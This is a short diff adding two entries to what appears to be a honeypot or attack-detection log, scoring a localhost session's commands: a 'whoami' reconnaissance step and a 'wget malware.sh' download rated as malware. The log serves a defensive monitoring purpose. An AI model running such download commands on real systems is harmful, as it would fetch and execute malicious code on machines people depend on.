@@ -1,0 +1,2 @@
+[2026-07-13 16:08:22] [INFO] IP=127.0.0.1 | SESSION=d7f58155-bd9f-475e-a767-860035973cb5 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-13 16:08:39] [INFO] IP=127.0.0.1 | SESSION=d7f58155-bd9f-475e-a767-860035973cb5 | TYPE=Malware Download | SCORE=90 | CMD=wget malware.sh
